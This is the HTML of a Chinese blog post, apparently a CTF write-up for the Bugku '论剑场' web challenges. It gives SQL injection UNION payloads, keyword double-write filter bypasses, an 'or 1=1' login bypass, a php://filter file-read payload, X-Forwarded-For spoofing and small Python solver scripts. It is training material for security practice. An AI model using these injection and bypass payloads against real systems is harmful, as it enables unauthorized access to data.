@@ -1,0 +1,1110 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="WEB Write UpWEB 1题目如上,看到了extract函数,让我想到了bugku的变量覆盖题目 构造payloadhttp://123.206.31.85:10001/?a=&amp;amp;b= 得到flag WEB 9打开页面看到    put me a message bugku then you can get the flag   联想到put传输 上脚本 12345678910imp">
+<meta name="keywords" content="CTF论剑场 CTF CTF论剑场wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF_论剑场 write wp(持续更新)">
+<meta property="og:url" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/index.html">
+<meta property="og:site_name" content="张灵灵的笔记">
+<meta property="og:description" content="WEB Write UpWEB 1题目如上,看到了extract函数,让我想到了bugku的变量覆盖题目 构造payloadhttp://123.206.31.85:10001/?a=&amp;amp;b= 得到flag WEB 9打开页面看到    put me a message bugku then you can get the flag   联想到put传输 上脚本 12345678910imp">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web1.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web9.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/流量分析.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/流量分析1.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/流量分析2.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web2.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web5.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web51.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web52.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web6.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web61.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web62.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web11.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web112.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web13.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web131.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/日志审计1.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/日志审计2.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/日志审计3.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web181.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web182.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web183.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web20.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web25.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web252.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web253.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web254.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web255.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web4.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web41.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web15.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web21.png">
+<meta property="og:updated_time" content="2019-05-31T05:15:57.198Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF_论剑场 write wp(持续更新)">
+<meta name="twitter:description" content="WEB Write UpWEB 1题目如上,看到了extract函数,让我想到了bugku的变量覆盖题目 构造payloadhttp://123.206.31.85:10001/?a=&amp;amp;b= 得到flag WEB 9打开页面看到    put me a message bugku then you can get the flag   联想到put传输 上脚本 12345678910imp">
+<meta name="twitter:image" content="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/web1.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>CTF_论剑场 write wp(持续更新) | 张灵灵的笔记</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">张灵灵的笔记</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tools">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tools/" rel="section"><i class="menu-item-icon fa fa-fw fa-users"></i> <br>tools</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/12/CTF-论剑场-write-wp-持续更新/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content>
+      <meta itemprop="description" content="夏天,那个夏天,还有那个夏天,即使经历无数次夏天,我还是说不出口。">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="张灵灵的笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CTF_论剑场 write wp(持续更新)
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-05-12 21:00:00" itemprop="dateCreated datePublished" datetime="2019-05-12T21:00:00+08:00">2019-05-12</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-05-31 13:15:57" itemprop="dateModified" datetime="2019-05-31T13:15:57+08:00">2019-05-31</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/学习笔记/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="WEB-Write-Up"><a href="#WEB-Write-Up" class="headerlink" title="WEB Write Up"></a>WEB Write Up</h1><h2 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB 1"></a>WEB 1</h2><p><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web1.png" alt="你想输入的替代文字"><br>题目如上,看到了extract函数,让我想到了bugku的变量覆盖题目</p>
+<p>构造payload<br><code>http://123.206.31.85:10001/?a=&amp;b=</code></p>
+<p>得到flag</p>
+<h2 id="WEB-9"><a href="#WEB-9" class="headerlink" title="WEB 9"></a>WEB 9</h2><p><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web9.png" alt="你想输入的替代文字"><br>打开页面看到    <strong>put me a message bugku then you can get the flag</strong>  </p>
+<p>联想到put传输</p>
+<p>上脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">url=&apos;http://123.206.31.85:3031/&apos;</span><br><span class="line">s=requests.session()</span><br><span class="line">data=&apos;bugku&apos;</span><br><span class="line">putmess=s.put(url,data) # put方式传输字符串bugku</span><br><span class="line">rep=putmess.content.decode(&apos;utf-8&apos;)</span><br><span class="line">print(rep) #得到base64字符串</span><br><span class="line">result=base64.b64decode(rep)  #base64解码</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+<p>先用put方式传输字符串‘bugku’,返回响应页面,得到base64加密的flag。<br>然后解码得到flag</p>
+<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/流量分析.png" alt="你想输入的替代文字"></p>
+<p>下载 <strong>流量分析.rar</strong> 后用Wireshark打开<br>过滤tcp<br><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/流量分析1.png" alt="你想输入的替代文字"><br><strong>右键追踪tcp流得到flag</strong></p>
+<p><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/流量分析2.png" alt="你想输入的替代文字"></p>
+<h2 id="WEB-2"><a href="#WEB-2" class="headerlink" title="WEB 2"></a>WEB 2</h2><p><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web2.png" alt="你想输入的替代文字"><br>联想到bugku老司机题目 直接上脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">"http://123.206.31.85:10002/"</span></span><br><span class="line">s=requests.Session()</span><br><span class="line">go=s.get(url)</span><br><span class="line">r=go.text</span><br><span class="line">restr=re.compile(<span class="string">r'[0-9+]+[*]+[0-9+]+[+]+[0-9+]+[*]+\(+[0-9+]+\)'</span>)</span><br><span class="line">fin=restr.findall(r)</span><br><span class="line">print(fin)</span><br><span class="line">result=eval(fin[<span class="number">0</span>])</span><br><span class="line">print(result)</span><br><span class="line">data=&#123;<span class="string">'result'</span>:result&#125;</span><br><span class="line">req=s.post(url,data)</span><br><span class="line">print(req.content.decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>
+<p>跑出flag</p>
+<h2 id="WEB-5"><a href="#WEB-5" class="headerlink" title="WEB 5"></a>WEB 5</h2><p>看到题目提示是 injection<br><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web5.png" alt="你想输入的替代文字">点击flag<br><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web51.png" alt="你想输入的替代文字"><br>查看url:<code>http://47.95.208.167:10005/?mod=read&amp;id=1</code></p>
+<p>order by 猜解列数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1 order by 1</span><br><span class="line">id=1 order by 2</span><br><span class="line">id=1 order by 3</span><br><span class="line">id=1 order by 4</span><br><span class="line">id=1 order by 5</span><br></pre></td></tr></table></figure>
+<p>一直猜到5,报错了</p>
+<p><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web52.png" alt="你想输入的替代文字"><br>构造payload<br><code>http://47.95.208.167:10005/?mod=read&amp;id=-1 union select 1,2,3,4;</code>  得知字段在第三列显示</p>
+<p><code>http://47.95.208.167:10005/?mod=read&amp;id=-1 union select 1,2,database(),4;</code>   得到库名为web5</p>
+<p><code>id=-1 union select  1,2,table_name,4 from information_schema.tables  where table_schema=&#39;web5&#39;</code> 得到表名为flag</p>
+<p><code>id=-1 union select 1,2,column_name,4 from information_schema.columns where table_name=&#39;flag&#39;</code>  得到字段名为flag</p>
+<p><code>http://47.95.208.167:10005/?mod=read&amp;id=-1 union select  1,2,flag,4 from flag</code>  得到flag值</p>
+<h2 id="WEB-6"><a href="#WEB-6" class="headerlink" title="WEB 6"></a>WEB 6</h2><p><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web6.png" alt="你想输入的替代文字"><br>查看页面源代码,在5023行发现类似base64的字符串<br><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web61.png" alt="你想输入的替代文字"><br>解码后得到 <code>test123</code><br>猜测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Username:admin</span><br><span class="line"></span><br><span class="line">Password:test123</span><br></pre></td></tr></table></figure>
+<p>尝试登陆,提示<br><strong>IP禁止访问，请联系本地管理员登陆，IP已被记录.</strong><br>加请求头 X-Forwarded-For:127.0.0.1<br><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web62.png" alt="你想输入的替代文字"></p>
+<p>重新登陆得到flag</p>
+<h2 id="WEB-11"><a href="#WEB-11" class="headerlink" title="WEB 11"></a>WEB 11</h2><p>整个页面只有一行 <code>We han&#39;t anything!</code><br>看到标题为<code>robots</code><br>访问<code>url/robots.txt</code>页面出现如下<br><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web11.png" alt="你想输入的替代文字"></p>
+<p>继续访问<code>url/shell.php</code> 出现如下界面<br><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web112.png" alt="你想输入的替代文字"><br>上脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makemd5</span><span class="params">(s)</span>:</span> <span class="comment">#定义一个函数包含参数s</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    <span class="string">'''hash.digest() </span></span><br><span class="line"><span class="string">返回摘要，作为二进制数据字符串值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">hash.hexdigest() </span></span><br><span class="line"><span class="string">返回摘要，作为十六进制数据字符串值 '''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span>  range(<span class="number">1</span>,<span class="number">99999990</span>):</span><br><span class="line">    <span class="keyword">if</span>(makemd5(str(x)))[<span class="number">0</span>:<span class="number">6</span>]==<span class="string">'5e84db'</span>:</span><br><span class="line">        print(x)</span><br></pre></td></tr></table></figure>
+<p>得到答案为 91805<br>提交答案得到flag<br>注:加密值每次都会刷新</p>
+<h2 id="WEB-13"><a href="#WEB-13" class="headerlink" title="WEB 13"></a>WEB 13</h2><p><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web13.png" alt="你想输入的替代文字"></p>
+<p>看到这样一个界面,查看源代码没发现什么,尝试注入等操作也都无效。</p>
+<p>开启burpsuite抓包</p>
+<p>看到响应包里有个password和hint<br><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web131.png" alt="你想输入的替代文字"></p>
+<p>提示是要把password解码然后传参,need to be faster提示速度要快</p>
+<p>上脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://123.206.31.85:10013'</span></span><br><span class="line">s=requests.session()</span><br><span class="line">go=s.post(url)</span><br><span class="line"></span><br><span class="line">password=go.headers[<span class="string">'password'</span>]</span><br><span class="line">password=base64.b64decode(password)</span><br><span class="line">password=str(password)[<span class="number">7</span>:<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line">data=&#123;<span class="string">'password'</span>:password&#125;</span><br><span class="line">gotwo=s.post(url,data)</span><br><span class="line">print(gotwo.content.decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure></p>
+<p>运行脚本跑出flag</p>
+<h2 id="日志审计"><a href="#日志审计" class="headerlink" title="日志审计"></a>日志审计</h2><p>下载log文件后搜索关键词<code>flag</code>,出现连续的url编码,最显眼的是<code>sqlmap</code>这个词语,因为题目让找出黑客攻击痕迹。</p>
+<p><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/日志审计1.png" alt="你想输入的替代文字"></p>
+<p>将一连串字符转码,发现可疑字符。</p>
+<p><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/日志审计2.png" alt="你想输入的替代文字"></p>
+<p>把可疑字符提取出来进行Ascii编码转换<br><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/日志审计3.png" alt="你想输入的替代文字"></p>
+<p>得到flag</p>
+<h2 id="WEB-18"><a href="#WEB-18" class="headerlink" title="WEB 18"></a>WEB 18</h2><p>看到题目是道<code>Sql injection</code>题</p>
+<p>点List 猜测URL存在注入<br><a href="http://123.206.31.85:10018/list.php?id=1" target="_blank" rel="noopener">http://123.206.31.85:10018/list.php?id=1</a></p>
+<p><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web181.png" alt="你想输入的替代文字"></p>
+<p>1’ 没有回显 1’ –+有回显</p>
+<p>经过测试过滤了 <code>and</code> <code>union</code> <code>select</code> <code>or</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造payload</span><br><span class="line"></span><br><span class="line">id=<span class="number">1</span><span class="string">'+anandd+1=1 --+   //正常界面</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1'</span>+anandd+<span class="number">1</span>=<span class="number">2</span> --+   <span class="comment">//报错</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//123.206.31.85:10018/list.php?id=1' oorrder by 3 --+</span></span><br><span class="line"></span><br><span class="line">通过order双写绕过猜出了列数为<span class="number">3</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123.206</span><span class="number">.31</span><span class="number">.85</span>:<span class="number">10018</span>/<span class="keyword">list</span>.php?id=<span class="number">-1</span><span class="string">' uniunionon seselectlect 1,2,3 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆出2,3列的显示位置</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web182.png" alt="你想输入的替代文字"></p>
+<p><code>http://123.206.31.85:10018/list.php?id=0&#39; ununionion seselectlect 1,group_concat(table_name,&#39;;&#39;,database()),3 from infoorrmation_schema.tables where table_schema=database() --+</code></p>
+<p>注意:information中or要双写绕过 </p>
+<p>爆出了表名和库名</p>
+<p><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web183.png" alt="你想输入的替代文字"></p>
+<p><code>123.206.31.85:10018/list.php?id=0&#39; ununionion seselectlect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name=&#39;flag&#39; --+</code></p>
+<p>爆出了列名</p>
+<p><code>123.206.31.85:10018/list.php?id=0&#39; ununionion seselectlect 1,group_concat(column_name),3 from flag --+</code></p>
+<p>从<code>flag表</code>中取出<code>flag列</code>的内容</p>
+<p>得到<code>flag</code></p>
+<h2 id="WBE-20"><a href="#WBE-20" class="headerlink" title="WBE 20"></a>WBE 20</h2><p><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web20.png" alt="你想输入的替代文字"></p>
+<p>上脚本,要多跑几遍才能跑出<code>flag</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x in  range(<span class="number">10</span>):</span><br><span class="line"> url=<span class="string">'http://123.206.31.85:10020/'</span></span><br><span class="line"> s=requests.session()</span><br><span class="line"> go=s.get(url)</span><br><span class="line"> rekey=<span class="string">"[0-9a-z]+"</span></span><br><span class="line"> key=re.findall(rekey,go.content.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"> urltwo=url+<span class="string">'?key='</span>+key[<span class="number">0</span>]</span><br><span class="line"> gotwo=s.get(urltwo)</span><br><span class="line"> <span class="keyword">print</span>(gotwo.content.decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure></p>
+<h2 id="WEB-25"><a href="#WEB-25" class="headerlink" title="WEB 25"></a>WEB 25</h2><p> burpsuite抓包看了一波没发现什么,快下课了，下午再做。。。</p>
+<p> 用御剑扫出了shell.php,先留着。</p>
+<p> <img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web25.png" alt="你想输入的替代文字"></p>
+<p>  <img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web252.png" alt="你想输入的替代文字"></p>
+<p>  把URL中这个2去掉<br>    <img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web253.png" alt="你想输入的替代文字"></p>
+<p><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web254.png" alt="你想输入的替代文字"></p>
+<p>真正的登录界面是shell.php</p>
+<p><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web255.png" alt="你想输入的替代文字"></p>
+<p>登录得到flag</p>
+<p>有点迷。。。。。。</p>
+<h2 id="WEB-3"><a href="#WEB-3" class="headerlink" title="WEB 3"></a>WEB 3</h2><p>长了个文件上传漏洞的题目的样子,却干着文件包含漏洞的事情。</p>
+<p><code>payload:http://123.206.31.85:10003/?op=php://filter/read=convert.base64-encode/resource=flag</code></p>
+<p>得到base64加密的flag,解密提交。</p>
+<p><code>php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；</code></p>
+<h2 id="WEB-4"><a href="#WEB-4" class="headerlink" title="WEB 4"></a>WEB 4</h2><p><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web4.png" alt="你想输入的替代文字"></p>
+<p>万能密码绕过<br>payload:<code>admin&#39; or 1=1 #</code></p>
+<p><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web41.png" alt="你想输入的替代文字"></p>
+<h2 id="WEB-15"><a href="#WEB-15" class="headerlink" title="WEB 15"></a>WEB 15</h2><p>提示vim,想起vim编辑器的备份文件.swp</p>
+<p>搜索<br><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web15.png" alt="你想输入的替代文字"></p>
+<p>然后在URL中把1ndex改成index,得到flag。</p>
+<h2 id="WEB-14"><a href="#WEB-14" class="headerlink" title="WEB 14"></a>WEB 14</h2><p>听说备份了不少东西呢 </p>
+<p>githack跑泄露直接得到flag.php</p>
+<p>里面有flag</p>
+<h2 id="WEB-21"><a href="#WEB-21" class="headerlink" title="WEB 21"></a>WEB 21</h2><p><img src="/2019/05/12/CTF-论剑场-write-wp-持续更新/web21.png" alt="你想输入的替代文字"></p>
+<p>查看源代码</p>
